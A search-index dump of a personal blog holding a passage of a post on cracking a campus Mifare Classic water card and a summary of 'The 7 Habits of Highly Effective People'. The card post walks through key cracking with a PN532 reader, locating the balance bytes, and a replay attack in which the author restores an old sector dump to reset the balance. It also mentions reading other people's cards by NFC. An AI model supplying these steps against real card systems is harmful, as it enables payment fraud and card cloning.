采取相同方法，一个攻击者可以侦听到卡与读卡器之间的通信内容并将其解密， 尽管可能涉及多重认证。这使得攻击者可以克隆一张卡，或者将卡的内容恢复到之前的状态。」 和 Nohl 的做法不同，他们公布了所有细节，包括 Mifare 芯片的算法逻辑和 他们自己设计的攻击手段。到此时，荷兰的 Radboud 大学 的研究者向世人公布了 三种攻击方法。然而他们并没有停下脚步，这之后他们又发表了 Wirelessly Pickpocketing a Mifare Classic Card 文中阐明了 M1 卡 在报文产生奇偶位和所谓嵌套认证两个方面的漏洞，利用此漏洞， 攻击者可以通过工具仅仅研究该工具与一片 M1 卡 之间通讯数据便可以成功破解该卡的 所有密钥，从而克隆这张卡。 此时 M1 卡 的破解才变成了我这种业余玩家也可以复现的轻松工作了。 文中设计了四种攻击手段，也是现在我们常用的四种方法，在实际操作中通常使用 第一种或者第四种（本文使用第二种方式完成破解）。 破解方法 暴力破解 即使是暴力破解，也需要先得到确切的明文和对应的码流。这大约要进行 1536 次认证过程， 用时在一秒钟之内。不过还要进行离线暴力破解，估计在 36 分钟可完成。 但是需要专用的硬件设备。 以读卡器的挑战值做变量 这里说的读卡器实际上指的是用来模拟读卡器的攻击工具，下个攻击亦如此。 这种攻击又可称为选择密文攻击，用工具控制被攻击的卡每次在认证时产生同一挑战值， 而读卡端则回应不同值。这种攻击需要大约 28500 次的认证过程，用时约 15 分钟， 然后计算密钥，用时约一分钟。 以卡的挑战值做变量 第三种攻击与攻击 2 类似，但需要使自己的工具的挑战值为常数，而令卡的挑战值数不断变化。 需要预制一个 384 GB 的 状态表（我怀疑 384 GB 这个数字有误）。 要进行 4096 次认证。大约用时 2 分钟。 嵌套认证攻击 第四种攻击假设攻击者已知了至少一个扇区的密钥，他可以根据漏洞得到其它密钥的 32 bit， 然后对其它 16 bit 进行穷举攻击。只需 3 次认证（时间可以忽略不计）。 离线攻击计算时间约为一秒。 ","date":"2022-11-04","objectID":"/ic-card-replay-attack/:3:0","tags":["Misc"],"title":"校园卡破解","uri":"/ic-card-replay-attack/"},{"categories":["Misc"],"content":"0x04 破解过程和工具 ","date":"2022-11-04","objectID":"/ic-card-replay-attack/:4:0","tags":["Misc"],"title":"校园卡破解","uri":"/ic-card-replay-attack/"},{"categories":["Misc"],"content":"PCR532 网上有大量的工具可供使用（这里使用卖家给的 PCR532 工具），同时无需单片机 而直接使用串口进行通信也省去了编码的麻烦。这也是我使用 PCR532 的一个原因， 而 PCR532 同时也是知名读卡器 ACR122U 所采用的读卡芯片，虽不及 Proxmark3（PM3） 但功能也十分强大了。 读卡器到手后就可以将 USB 那端连进电脑了（手机需要 OTG 转接）。 这里以 Windows 系统为例，这大概也是大部分读者所使用的操作系统。 装一下卖家提供的驱动程序，一切就绪后就可以开始破解啦。 ","date":"2022-11-04","objectID":"/ic-card-replay-attack/:4:1","tags":["Misc"],"title":"校园卡破解","uri":"/ic-card-replay-attack/"},{"categories":["Misc"],"content":"破解过程 这时把要读取的卡片放在读卡器上就行，但是我要做的是破解卡而不是复制卡。 所以在此之前，我先把卡放在水控机上看了下余额，记录下来以便分析内容。 记好之后先 连接设备 ，然后点击界面中的 开始解卡 按钮进行对卡密钥的 破解和内容读取。此时软件正在进行的操作就是之前提到的第二种方法。 这个过程不会持续很长时间，稍等就好，期间卡也不要拿开读卡器。 读取出来之后点击 保存数据 按钮把卡内容以 dump 格式保存到本地，以便分析。 然后再去水控机那边消费一笔，再重复上面的工作读取一遍新余额状态下的卡数据。 这样做是为了方便后续分析金额位等各个数据位的含义。 这时已经拿到了两次的卡内容。用软件自带的 对比数据 功能比较两个 dump 文件 就可以观察到文件有什么异同了。 对于数据分析的思路，一般都是从金额位下手。所以，我们对金额进行数据转换， 因为扇区存储的都是 16 进制的数据，所以我们的转换也同样如此。 18.700 → 490C 17.900 → 45EC 转换结束，我们立马就能发现金额位在我们的第一、二块区域，唯一的差异就是 扇区里的数据用小端存储了，所以 区域 ① （第一、二块前两位数据）为金额位。 接着，我们看数据间的关系发现，区域 ② 之间只是做了一个简单的加法运算。 0017 + 2 = 0019 转换一下大小端就是 1900 。因为我测试的时候刷了两次卡，而这里数据也是加了2。 因此推出 区域 ② 代表刷卡次数（这点通过多刷卡可以验证）。 0017 转十进制是 23 ，0019 转十进制是 25 。逻辑与实际情况上都符合我的刷卡次数。 区域 ③ 暂时看不出来什么东西，盲猜可能是校验位。果断修改卡余额， 把 EC45（17.900）改成 0C49（18.700） 。改完只重写第 15 扇区 ， 然后去水控机那边刷一下，报错。因此推断出 区域 ③ 应该是校验位。 至于校验位怎么算，因为我取的样本太少，加上技术不佳，还没推出来 后面有空研究出来了还会再写一篇文章的。 注：第一、二块内容都是一样的，修改数据时也要注意保证两块数据相同才行。 因为我还没有推出校验算法，所以不能任意修改卡金额。但是可以通过 重放攻击 来重置卡余额。重放攻击是指将一卡通使用之前的数据保存下来，当一卡通余额用完时， 将之前的数据重新写入到卡中，将同一个数据重复使用，达到无限次消费的目的。 一般来说，为了便于读卡器使用固定算法验证金额，一所学校下所有的一卡通在某一金额 时的数据应是相同的，这也就导致了对一卡通数据的重放攻击可以被简单的实现。 我现在最高余额数据是 18.700 那个，先花掉一点。因为只有第 15 扇区 数据会改变， 所以我们只把原先 18.700 状态时的第 15 扇区 内容替换到现在的第 15 扇区 。 替换方法有很多，可以直接用 PCR532 工具，也可以使用 MCT 工具替换，这里不过多赘述。 替换后再去水控机那边插一下，发现余额已经重置，并且机器可以正常使用。 注：对卡数据更改时请确保你知道自己在做什么，以及万一出问题了最好有办法恢复还原。 否则不建议瞎改，改坏了卡用不了了还得花钱去补卡，赔本。建议备份每次改动前的数据， 这样万一改错了还可以用原先的数据覆盖错误数据来还原。 ","date":"2022-11-04","objectID":"/ic-card-replay-attack/:4:2","tags":["Misc"],"title":"校园卡破解","uri":"/ic-card-replay-attack/"},{"categories":["Misc"],"content":"0x05 总结 经过我的简单研究，发现破解这样一张水卡已经变得相当简单了，各种破解工具和软件 都可以很容易下载到。就算你不想打命令，对黑色的命令行感到恐惧也可以很容易找到 GUI 的版本而且功能丝毫不打折扣。而在硬件操作方面，除了有玩家通过单片机控制 射频卡模块的，还有类似 PCR532 直接连接电脑用上位机操作的，甚至还有类似 Proxmark 3 这样基于 FPGA 的专业射频卡安全评估套件。如果想要复制一张一模一样 的卡用在电梯或者门禁上，有一种特殊的 UID 卡可以轻松买到，价格也很低廉。 这样看来整个 M1 卡 破解与克隆似乎已经形成了完整的产业，不得不令人担忧其在 门禁领域的安全性。实体入侵的风险主要在于被发现，而复制一张卡要比翻栏杆轻松多 也隐蔽多了。一般一卡通都是放在口袋里，只要一部带 NFC 的手机在距离目标 4CM 的范围内感应即可获取他人的卡数据，从而进行重放攻击。 M1 卡 技术的安全漏洞早在 08 年已被公布，但时至今日仍然有大量的酒店门禁卡、 校企一卡通使用这种老旧技术，很容易被破解造成经济损失。我校一卡通使用了 M1 S50 1K 容量卡 ，相对 1K 容量卡较为少见，使用 PN532 方可破解， 而很多地方的 RFID 系统 用的是 1K 容量的卡，针对这种卡的破解方案太多了， 绝大多数使用几十元的设备即可破解。有能力使用 CPU 卡 设备的需要尽快更新设备， 有些地方因为设备较多，老用户基数较大的情况不能立马使用新设备的要加强管理， 例如我校的一卡通除了水费、小卖部消费扇区使用一卡一密外，其他扇区均使用了统一的密钥， 如果有人将统一的密钥泄漏出去，那么其他人使用手机 NFC 通过该密钥读取水卡扇区， 篡改卡金额，几乎没有任何成本。 对于卡片的介绍、分析到此为止。但流程和原理已经介绍的足够清楚了。令人不解的是 这样的卡片居然还在被广泛使用在各个场所，从安保到消费均有涉足，而且全程不需要 用特别的仪器接近目标设备即可完成破解。对攻击者越安全，对被攻击物就越危险！ 所以，这样的攻击更加实用，更具危害。但无论是挑起争端的 Nohl 还是荷兰的 Radboud 大学 都推进了卡片安全的发展，然而当下的广泛使用可能还是会令他们始料不及。 当然产生这样的结果可能还有一个重要的原因是：其实在这类应用系统上获利的诱惑 还不够大，因此攻击者并不多。 ","date":"2022-11-04","objectID":"/ic-card-replay-attack/:5:0","tags":["Misc"],"title":"校园卡破解","uri":"/ic-card-replay-attack/"},{"categories":["Book"],"content":"关于作者 本书作者 史蒂芬·柯维，是全球最大的、为组织和个人提供培训和管理咨询的 世界顶级机构——富兰克林柯维公司创始人之一。他被评为美国学界的「思想巨匠」， 入选「影响美国历史进程的 25 位人物」，被 《时代周刊》 评为「人类潜能的导师」。 也是世界备受推崇的领导权威，家庭问题专家，教师、企业组织顾问，在领导管理理论、 家庭与人际关系、个人管理等领域久负盛名。 著有畅销书 《高效能人士的七个习惯》、《领导者准则》、《高效能家庭的7个习惯》 等。 这本书自 1989 年 在美国出版上市以来，备受各界喜爱，它的影响力仅次于 《圣经》， 同时它也是美国公司员工、政府机关公务员、军队官兵装备书…… 可想而知，这本书是多么的受欢迎。 ","date":"2022-10-22","objectID":"/the-7-habits-of-highly-effective-people/:1:0","tags":["Book","Life"],"title":"《高效能人士的七个习惯》","uri":"/the-7-habits-of-highly-effective-people/"},{"categories":["Book"],"content":"0x01 变化的世界，不变的原则 摘要 世界是在不断变化发展的，但是有一些原则经得起时间的考验，不管世界如何改变， 它们都是不会发生改变的。 曾有人问 史蒂芬·柯维 博士，「今后10年、20年、50年甚至100年， 《高效能人士的七个习惯》 是否依然有效？」 史蒂芬·柯维 博士回答：「变化越彻底，挑战越严峻，这七个习惯对人们越重要。 因为我们的问题和痛苦是普遍存在的，并且日趋严峻。 而它们的解决之道，一直而且永远都建立在普遍、永恒、不证自明的原则之上， 这些原则普遍存在于人类历史上每一个痛苦而又繁荣的社会。」 但是 史蒂芬·柯维 也强调，这些原则并非他首创，他只是发掘并把它们整理出来而已。 这些原则是什么呢？就是他所提倡的高效能人士的七个习惯，本书的精髓所在。 所谓「原则」，应该是一种放之四海皆准的行为原则，一种真理，就像万有引力一样的 自然法则。 如: 公平，公正、正直、正义、诚实、友善、爱等。 人们的幸福生活，需要在这样的「原则」的指导下成长。 接下来我们聊一下，什么是习惯。 ","date":"2022-10-22","objectID":"/the-7-habits-of-highly-effective-people/:2:0","tags":["Book","Life"],"title":"《高效能人士的七个习惯》","uri":"/the-7-habits-of-highly-effective-people/"},{"categories":["Book"],"content":"0x02 七个习惯分述 史蒂芬·柯维 博士说，习惯是「知识」、「技巧」、与「意愿」相互交织的结果。 摘要 知识，指点我们去「做什么」及「为何做」 技巧，告诉我们该「如何做」，用什么方法来做 意愿，是动机，促使我们「想要做」，是动力来源 在三者的相互交织作用下，长期反复，就变成了一个人的习惯。 所以，要养成一种习惯，三者缺一不可。好习惯的培养，也需要三方面的努力， 三管齐下，习惯赢得天下。 接下来我们看图： ","date":"2022-10-22","objectID":"/the-7-habits-of-highly-effective-people/:3:0","tags":["Book","Life"],"title":"《高效能人士的七个习惯》","uri":"/the-7-habits-of-highly-effective-people/"},{"categories":["Book"],"content":"模型解读 这是 《高效能人士的七个习惯》 的 成熟模型图，全书围绕着这个模型展开论述。 里面所强调的七个习惯，也是本书作者 史蒂芬·柯维 博士所说的「原则」的具体表现。 从图中，我们可以很清晰的看到，这七个习惯，在模型里并非是零散分布的，相反， 他们的位置排列摆放相当有序，无论缺少哪些部分，或者调换了位置都会变得不合理。 同时，这七个习惯的排列，也符合我们的成长发展规律，从 依赖 到 独立，再到 互赖， 不断进步。 摘要 处于依赖期的我，以「你」为核心，你照顾我，你为我的得失成败负责 处于独立期的我，以「我」为核心，相信我可以做到，我可以负责，我可以靠自己， 我有权选择 处于互赖期的我，以「我们」为核心，认为我们可以做到，我们可以合作， 我们可以融合彼此的智慧和能力，共创前程 就像年幼的我们没有自理能力，各方面都很弱，只能依靠长辈保护我们； 长大后各方面的条件都成熟可以独立了，我们开始有能力为自己负责， 去开阔自己的天空；后来意识到社会是由一个个复杂的系统组成的，物质之间互为关联。 而人是社会活动的主体，不管你再怎么独立，若想取得一些成就都不能和社会脱节， 这就需要我们学会处理好人际关系，和他人更好地相处与合作，彼此成就。 当我们开始「七个习惯」的学习，就代表要从依赖期转向独立期。走进独立期， 很重要的一点，就是开始主动负责。 在这个阶段里，我们需要培养好前面三种习惯，养成「积极主动」、「以始为终」、 「要事第一」的好习惯， 并把它们作为生活的指导原则。 ","date":"2022-10-22","objectID":"/the-7-habits-of-highly-effective-people/:3:1","tags":["Book","Life"],"title":"《高效能人士的七个习惯》","uri":"/the-7-habits-of-highly-effective-people/"},{"categories":["Book"],"content":"习惯 1：积极主动 因为人的本质是主动的。我们可以主动控制自己的行为，可以为自己的行为和选择负责。 同时也可以发挥人的主观能动性，以积极主动的心态，面对问题，创造性地解决问题。 积极主动的空间在哪？ 案例 「都是他逼我这么做的」 「你知道我妈那个人的，我必须听她的」 「他太吵了，我只能打他一顿」 「离婚手续太复杂，我只能和她在一起」 这些话是不是很熟悉？这些都是把刺激到回应之间自己那部分的责任推卸给他人的表现。 事实上，在刺激到回应之间，我们还有很大一部分空间，可以做出自主选择。 母亲逼迫 我们选择不喜欢的职业，这就是一种外界刺激。当刺激发生后，我们可以选择坚持自己 的想法而反抗母亲，也可以选择让母亲高兴而顺从她的选择——但记住，这最终是经由你 自己选择的，而不要再说自己是被逼无奈。这就是积极主动的开端，习惯主动负责， 遇到再不好的境遇，才会知道没有人可以逼迫我，我永远有选择走哪一条路的主动权。 影响圈与关注圈 明白自己要积极主动后，我们应该主动投身哪些事情，才能做到高效能呢？除去我们没兴趣、 不关注的部分，世上的事情都处在我们的关注圈，而其中有一部分是我们通过自己的行为 能对其产生影响的，就是影响圈。积极主动者专心做自己力所能及的事，长此以往，他们的 影响圈会逐渐扩大；消极者过于关注无法改变的部分，则容易产生消极能量，使影响圈不断 缩小，我们应该关注在影响圈，使其不断扩大。 ","date":"2022-10-22","objectID":"/the-7-habits-of-highly-effective-people/:3:2","tags":["Book","Life"],"title":"《高效能人士的七个习惯》","uri":"/the-7-habits-of-highly-effective-people/"},{"categories":["Book"],"content":"习惯 2：以始为终 不管是工作还是做计划，我们都需要先有明确的目标，知道自己做这件事想要达成什么样 的效果。就算过程中出现再多的杂事，也不会干扰你清楚的看见所要追求的目标。 两次创造 任何事物都需经过两次创造，一次在头脑中，一次在实际中。这很好理解，比如我们建造 一座花园，总是先脑中有了构思，再在笔下绘制蓝图付诸建造。人生也是一样。 我们每个人的家庭背景、早年生活环境、早年受教育情况及外界限制构成了人生的第一次 创造，可能很潦草，可能不尽如人意，但是今后的漫长一生，则取决于你就此顺流而下， 还是主动设计第二次的创造。 设计的准则是什么？ 这取决于目的是什么。我们做每一件事情，都必须先明确目的——也就是终点。 我们总是 先看见终点，然后奔向终点。做每一件事都如此。而渺茫如人生，也应当有这样一座遥远的 灯塔可供眺望，继而将我们的每一步、每一件事都统纳到正确的航向上，安全出行。 人生应当以什么为灯塔（中心）？ 这还是需要回到核心区域来回答。还记得影响圈和关注圈吗？就我们所看到的， 有人以事业为中心、有人以金钱为中心、有人以配偶为中心、有人以孩子为中心…… 然而这一切大都处于影响圈与关注圈的边界，是否可控并不由我们一个人说了算。 『所以，生活中心摇摆不定，我们自己的情绪难免起起落落，一会儿意气风发， 一会儿颓废沮丧，没有稳固的方向，也没有稳定的力量。』所以 史蒂芬·柯维 提出， 我们应该以原则为中心，度过我们的人生。 原则由我们自己信奉，完全可控； 原则就像一条真理，可以被我们默诵，给我们以力量和安全感；原则具有囊括性， 可以对生活中的多数事件给予指导，可以允许我们不断修正我们的局限。 以终为始， 说的就是我们应以原则为中心，指导自己规划人生，并要始终牢记这座「灯塔」的位置， 使自己不致偏离航向。 ","date":"2022-10-22","objectID":"/the-7-habits-of-highly-effective-people/:3:3","tags":["Book","Life"],"title":"《高效能人士的七个习惯》","uri":"/the-7-habits-of-highly-effective-people/"},{"categories":["Book"],"content":"习惯 3：要事第一 要把最重要的事情放在首位，不要被其他看似紧急，实际上并不重要事情给欺骗了。 换句话说就是要能够分清楚什么事情对「我」来说是最重要的，多花时间做这类事情， 不要被眼前的琐事牵着鼻子走。 坚持用这 3 个习惯来生活，我们把内在的自己「搞定」了，对自己有了一些影响力， 个人也开始获得一些成就。这时候，我们才会有足够的信心，再继续往外发展， 逐渐去追求公众领域的成功。 想在公众领域获得成功，考虑的事就不再只和「我」有关的事情了，而是和「我们」有关的事。 所以，接下来我们需要重点培养 「双赢思维」、「知彼解己」、「统合综效」 这三个习惯。 时间管理矩阵 在时间管理矩阵中，我们发现日常需处理的事务可简要分为四类： Ⅰ类，重要且紧急 Ⅱ类，重要不紧急 Ⅲ类，紧急不重要 Ⅳ类，不重要且不紧急 那么，我们首要处理的要事，属于哪一个象限呢？ 最该首要处理的要事是谁？答案是：Ⅱ类。这些重要但不紧急的事情，因为没有 截止日期的催促，常常就被我们一拖再拖，令我们陷入永远在处理Ⅰ类甚至Ⅲ类 那些紧急事务的焦虑状态。而一旦有了空闲，我们又将时间毫无知觉地投入了Ⅳ类 那些打发时间的娱乐或者无关紧要的琐事里。 角色管理 ① 列出你的 个人/社会 角色，如：自我、（父母的）儿子、（孩子的）父亲、 （公司的）程序员 ② 然后写下每个角色本周的对应任务，如： 角色 本周任务 自我 阅读《非暴力沟通》 丈夫 给妻子准备生日礼物 父亲 陪孩子阅读绘本 程序员 完成某某需求开发 ③ 勾选出每个角色你认为重要的事情，并尽一切可能保证它们与你的人生目标方向一致， 然后优先完成它们。 学会授权 简单来说，就是将手头可以分出去的事情，合理分配给他人。这很好理解。 但是我们很多人却做不好授权，看似把事情分出去了，却还是自己从头管到脚。 我们应该做的是责任型授权。 双方沟通好需要达成的结果是什么，给予对方一些基于资源、陷阱的指导而非具体事项， 明确责任与奖惩即可。 ","date":"2022-10-22","objectID":"/the-7-habits-of-highly-effective-people/:3:4","tags":["Book","Life"],"title":"《高效能人士的七个习惯》","uri":"/the-7-habits-of-highly-effective-people/"},{"categories":["Book"],"content":"习惯 4：双赢思维 社会是人际交往的中心，在人际交往过程中，重要的是要有双赢思维，我们不能 总是让别人输自己赢，或者自己输别人赢，或者两者都输，这些从长远的角度考虑， 都是不长久。但是，如果能做到你我都赢，你我都能从合作中获利，那么合作就会 长长久久，直到地老天荒。 你真的理解双赢吗？ 双赢并不是简单地 1 + 1 ＞ 2，它需要双方都从中努力。既要顾及他人利益， 以维持合作关系，同时也需要坚持自己的原则，不轻易退缩，双方需要进行真诚的沟通、 理智且适度的后退，以达成的确令彼此都满意的成果。 不能双赢就好聚好散 「无法实现双赢就干脆放弃」的原则也会让大家感到轻松。就像我们俗语常说的， 买卖不成仁义在，就事论事，实在不能达成双方都满意的合作时，放弃这次的合作， 是一种理智的、避免各自受损的好做法，本次累积的情感账户额度，也可以在下次 合作中产生应有的作用。 ","date":"2022-10-22","objectID":"/the-7-habits-of-highly-effective-people/:3:5","tags":["Book","Life"],"title":"《高效能人士的七个习惯》","uri":"/the-7-habits-of-highly-effective-people/"},{"categories":["Book"],"content":"习惯 5：知彼解己 人际交往沟通的过程，需要了解彼此，方能找到最合适的相处之道。学会用心聆听， 才能更好地去理解、尊重与认可对方。同时也要面对真实的自己，接纳自己。 知彼需要仁慈心，解己需要勇气。 先体验，再开药 「我妈妈不同意我去其他城市发展……」 「噢~你是成年人了，坚持自己！」 「我对象送了两百块人民币的七夕礼物……」 「赶紧分，不分留着过年吗！」 「我这个周末要加班……」 「辞了辞了！对自己这么苛刻干嘛？」 这些对话是不是也很眼熟呢？并没有了解清晰的状况、为了回应而回应，随便地提出 解决方案…… 看似我们在与对方认真谈话，但这并不属于有效沟通。有效沟通始于准确 的聆听。 自传式回应 上述这些都属于我们的常发病——自传式回应它的主要症状有这么四种： 价值判断——表示肯定或否定 追根究底——依据自己的立场，探究别人的隐私 好为人师——以个人生活经验指导他人 自以为是——根据自己的行为动机判断别人的 移情式聆听 我们应该知道，即便听取他人的可行意见是一种理智的做法，但是好建议并不是每次 都那么容易让人接受…… 比如给予建议者的态度、建议本身的实施难度、接收方的心情等 都会对此造成影响。只要我们将自己代入接收方的角色想一想，就会发现此言不虚。 移情式聆听，就是需要身为倾听者的我们，代入倾诉者的角色，感同身受地了解对方 此番谈话的真正目的，并掌握准确清晰的事实，再通过对对方情感的客观反馈，来实现 真实有效的沟通。记住，说出对方的感受，而不要判断（这里和 《非暴力沟通》 遥相呼应）。 ","date":"2022-10-22","objectID":"/the-7-habits-of-highly-effective-people/:3:6","tags":["Book","Life"],"title":"《高效能人士的七个习惯》","uri":"/the-7-habits-of-highly-effective-people/"},{"categories":["Book"],"content":"习惯 6：统合综效 统合综效是第三种创造选择，既非按照我的方式，也非按照你的方式，而是我们商量着来创造出 第三种更好的方式。 它是互相尊重的成果，让我们的选择达到 1 + 1 ＞ 2 的效果。 不妥协，也不终止合作，而是为达成更好的目标创新合作方式。 在公众领域获得成功我们需要养成这些习惯，试问有谁不喜欢与有这些习惯的人合作呢？ 几乎没有！ 统合综效是一种心态 「如果一位具有相当聪明才智的人跟我意见不同，那么对方的主张必定有我尚未体会的奥妙， 值得加以了解。」 摘要 与人合作最重要的是，重视不同个体的不同心理、情绪与智能，以及各人 眼中所见到的不同世界。与所见略同的沟通，益处不大，要有分歧才有收获。 三个层次 沟通的三个阶段层次分别是： 互相提防（有输有赢模式，信任度低） 互相尊重（妥协模式，信任度中） 统合综效（双赢模式，信任度高） 一个案例 为了理解沟通层次的意义，我们以一个案例来说明：「老胡策划度假，准备了很久，想利用国庆 假期带妻子和两个儿子去度假。妻子却想利用难得的假期去探望久病不愈的母亲。两人谁也无法 说服对方。如果全家出游，妻子总是挂心母亲，全家都玩不痛快；如果去探望岳母，则老胡心中 始终为准备许久的度假泡汤而闷闷不乐。即便调整一下，妻子独自去探望母亲，老胡带着孩子 出游，则一家人也都玩不尽兴。」他们最终想出了双赢的方案：「去岳母家附近度假，或在节后 请家务公司代劳一周，让妻子有空探望岳母。」 第三选择 这个案例就是典型的「第三选择」。遇到分歧时，不应先急着妥协或对抗，要知道你们给出的选项， 或许都不是最佳的那个。要有信心能找出双方都满意的第三选择——要诀就是：尊重差异、调动创意。 用开放、创造的眼光重新审视面前的问题，化阻力为动力。 ","date":"2022-10-22","objectID":"/the-7-habits-of-highly-effective-people/:3:7","tags":["Book","Life"],"title":"《高效能人士的七个习惯》","uri":"/the-7-habits-of-highly-effective-people/"},{"categories":["Book"],"content":"习惯 7：不断更新 指的是在生活的四个基本方面，分别在身体、精神、智力、社会/情感 方面，不断的更新自己， 以达到一种最佳的平衡状态。同时也为前面的 6 种习惯做好铺垫，时刻做好不断完善及更新的准备， 让整个机体实现最高的效能。 自我提升和完善的四个层面 说到底，我们是这些习惯的操作者，为了保证我们成熟而灵活地运用前六个习惯，不断提升和完善 自我就显得非常重要了。史蒂芬·柯维 将自我提升和完善的方法梳理成四个层面，以方便我们具体施行： 关于身体的建议——健康饮食、充足休息、定期锻炼 关于精神的建议——欣赏优秀的文学或音乐作品、与大自然相处、思考与独处 关于智力的建议——不断学习知识，靠阅读、写作、参加课程等身体力行的方式使用智力 关于 社会/情感 的建议——不需特意花费太多时光，可在日常与他人交往中完成，但也需要保持警醒， 给予自我激励或鞭策 平衡更新 关于这四个层面的更新，史蒂芬·柯维 强调，我们应该平衡好四个层面的更新进度，共同推进。 结合之前的六个习惯，要实现稳定而卓越的进步，他告诉我们一个诀窍：每天至少花一个小时， 去实现「个人领域的成功」（从身体、精神、智力这些个人层面的可操作事项出发），这是培养 「高效能人士的七个习惯」的关键。 ","date":"2022-10-22","objectID":"/the-7-habits-of-highly-effective-people/:3:8","tags":["Book","Life"],"title":"《高效能人士的七个习惯》","uri":"/the-7-habits-of-highly-effective-people/"},{"categories":["Book"],"content":"0x03 总结 很多比我们优秀的人却比我们还努力，他们有这那么多类似积极、高效、友善、自律，着实 令人叹服的好习惯。想要像他们一样，先从这七个他们共有的习惯学起来。这七个习惯按照 一定的顺序由内而外发展，不断进步，实现独立自强与有效的互赖。 这本书，我强烈推荐给大家，不但要去认真阅读，而且还要学习里面提到的 7 种习惯，结合 书本上给的练习去做，去践行。 关于这本书的阅读方式，我推荐你们在身边找到可以与自己一起读的人。每读完一部分都可以 找身边的人分享阅读感受和自己的真实经历。有助于对这七个习惯更深刻的了解和总结自己以后 应该怎么做。书也不是读完结束的，配合践行的同时也可以反复阅读。 （自从我的老师把这本书推荐给我后，我已经反复阅读三遍了。并且每次阅读都会有新的体会， 发现自己的问题，并积极改进。尽管改了一年还是有些问题，比较难改，但我相信坚持下来 终会改掉的 :D 最后用作者的一句话做个结尾：「只学不做等于没学，只知不做等于未知。」 ","date":"2022-10-22","objectID":"/the-7-habits-of-highly-effective-people/:4:0","tags":["Book","Life"],"title":"《高效能人士的七个习惯》","uri":"/the-7-habits-of-highly-effective-people/"}]